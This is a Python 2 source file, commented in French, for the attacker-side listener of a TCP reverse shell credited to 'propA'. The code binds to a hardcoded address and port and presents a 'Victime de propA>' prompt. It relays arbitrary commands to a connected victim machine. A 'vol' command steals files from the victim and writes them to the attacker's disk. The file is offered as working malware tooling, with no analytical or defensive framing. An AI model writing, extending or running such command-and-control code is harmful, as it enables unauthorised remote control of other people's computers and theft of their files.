# Reverse Shell TCP by propA
# Server-side
import socket
import os

def transfer(conn, command):

    conn.send(command)

    bits = conn.recv(1024)

    if '!!!Fichier specifie introuvable!!!' in bits:
        print '[-] Impossible de trouver le fichier, t\'es sur du path?'

    elif 'Nom du fichier:' in bits:
        nomFichier = str(bits).replace("Nom du fichier:", "", 1).split("\\")
        print nomFichier[-1]
        f = open(nomFichier[-1], 'wb')
        

        while True:   
                       
            if 'Paquet de fin de fichier' in bits:
                print '[+] Fichier '+nomFichier[-1]+' recu et enregistre dans le path courant'
                f.close()
                break
        
            f.write(bits)
            bits = conn.recv(1024)
        
        f.close()


def connect(ipServer, portServer):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ipServer, int(portServer)))
    s.listen(1)
    conn, addr = s.accept()
    print '[+] Nouvelle connexion de: ', addr
    print 'Taper \'aide\' pour obtenir les commandes possibles'

    while True:

        command = raw_input("Victime de propA> ")

        if 'aide' in command:
            print ''
            print 'Commandes accessibles:'
            print '     fermer -> clore la connexion avec la cible'
            print '     vol -> voler un fichier ex: vol C:\\fichier\\a\\recuperer'
            print ''

        elif 'fermer' in command:
            conn.send('terminate')
            conn.close()
            break

        elif 'vol' in command:
            transfer(conn, command)


        else:
            conn.send(command)
            print conn.recv(1024)


def main():

    #ipServer = raw_input("Adresse IP du serveur (ifconfig): ")
    #portServer = raw_input("Port a ecouter (8080?): ")
    ipServer = "10.142.10.22"
    portServer = "50505"
    connect(ipServer, portServer)


main()
